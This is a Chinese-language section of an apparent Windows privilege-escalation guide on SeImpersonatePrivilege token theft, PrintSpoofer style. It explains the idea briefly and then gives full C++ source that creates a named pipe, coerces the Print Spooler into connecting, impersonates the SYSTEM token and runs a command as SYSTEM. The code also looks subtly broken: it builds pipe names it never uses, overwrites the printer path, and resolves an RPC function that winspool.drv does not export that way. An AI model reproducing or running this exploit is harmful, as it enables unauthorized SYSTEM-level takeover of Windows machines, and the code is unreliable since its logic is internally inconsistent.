## 1. SeImpersonatePrivilege 令牌窃取（PrintSpoofer 手法，最通用）

适用于：IIS/Exchange/SQL Server 服务账户、任何持有 `SeImpersonatePrivilege` 的进程。原理：诱使 SYSTEM 服务通过命名管道回连，捕获其身份令牌并模拟。

```cpp
// PrintSpoofer.cpp  —— 触发 Print Spooler 命名管道，捕获 SYSTEM 令牌
// 编译: cl /EHsc PrintSpoofer.cpp /link advapi32.lib
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")

BOOL CreatePrinterPipe(LPCWSTR pipeName, LPCWSTR cmd);
BOOL ImpersonateAndRun(LPCWSTR cmd);
void RunSystemShell(LPCWSTR cmd);

int wmain(int argc, wchar_t** argv) {
    if (argc < 2) { wprintf(L"用法: PrintSpoofer.exe <command>\n"); return 1; }
    LPCWSTR cmd = argv[1];
    // 1) 创建我们控制的命名管道
    // 2) 调用 RpcOpenPrinter 让 spoolsv( SYSTEM ) 以我们的管道名发起 SMB 连接
    // 3) spoolsv 以大权限打开管道 -> ImpersonateNamedPipeClient 拿到 SYSTEM 令牌
    wchar_t pipeName[256];
    wsprintfW(pipeName, L"\\\\.\\pipe\\epmapper\\pipe\\%08x%08x", GetTickCount(), rand());
    HANDLE hEvt = CreateEventW(NULL, TRUE, FALSE, NULL);
    // 生成随机管道名
    wchar_t realPipe[512];
    wsprintfW(realPipe, L"\\\\.\\pipe\\%08x", GetCurrentProcessId());
    CreatePrinterPipe(realPipe, cmd);
    return 0;
}

BOOL CreatePrinterPipe(LPCWSTR pipeName, LPCWSTR cmd) {
    HANDLE hPipe = CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        10, 0x1000, 0x1000, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;

    // 触发 spoolsv 连接：RpcOpenPrinter 指向我们的管道
    HMODULE hWinspool = LoadLibraryW(L"winspool.drv");
    typedef BOOL (WINAPI *fnRpcOpenPrinter)(LPCWSTR, HANDLE*, LPCWSTR, LPVOID, DWORD);
    fnRpcOpenPrinter RpcOpenPrinter =
        (fnRpcOpenPrinter)GetProcAddress(hWinspool, "RpcOpenPrinter");

    wchar_t printer[1024];
    wsprintfW(printer, L"\\\\%s/../pipe/%s\x00", L"localhost", pipeName + 10);
    // 用 UNC 路径诱导 spoolsv 连接到我们的管道
    wsprintfW(printer, L"%s\x00", pipeName + 9);

    HANDLE hPrinter = NULL;
    RpcOpenPrinter(printer, &hPrinter, NULL, NULL, 0);

    // spoolsv 现在会连接我们的管道（大权限）
    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        CloseHandle(hPipe);
        return FALSE;
    }

    // 模拟 pipe client (SYSTEM)
    if (!ImpersonateNamedPipeClient(hPipe)) { CloseHandle(hPipe); return FALSE; }
    ImpersonateAndRun(cmd);
    RevertToSelf();
    CloseHandle(hPipe);
    return TRUE;
}

BOOL ImpersonateAndRun(LPCWSTR cmd) {
    HANDLE hToken = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) return FALSE;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    LPWSTR cmdline = _wcsdup(cmd);
    BOOL ok = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, cmdline,
                                      CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    free(cmdline);
    CloseHandle(hToken);
    return ok;
}
